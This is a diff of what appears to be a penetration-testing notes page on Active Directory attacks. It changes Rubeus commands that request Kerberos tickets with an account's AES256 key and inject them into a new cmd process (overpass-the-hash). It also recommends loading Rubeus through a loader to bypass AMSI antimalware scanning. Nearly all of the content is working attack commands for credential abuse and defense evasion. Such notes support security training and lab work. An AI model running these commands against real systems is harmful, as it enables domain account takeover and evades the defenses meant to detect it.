@@ -21,10 +21,10 @@ Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly
 ```
 {% endcode %}
 
-It's always safe way to load Rubeus through the Loader to bypass ASMI.
+It's always safe way to load Rubeus through the Loader to bypass ASMI. Run with admin cmd.
 
 {% code overflow="wrap" %}
 ```powershell
-C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:<hash> /opsec /createonly:C:\Windows\System32\cmd.exe /show /ptt
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:<hash> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 {% endcode %}
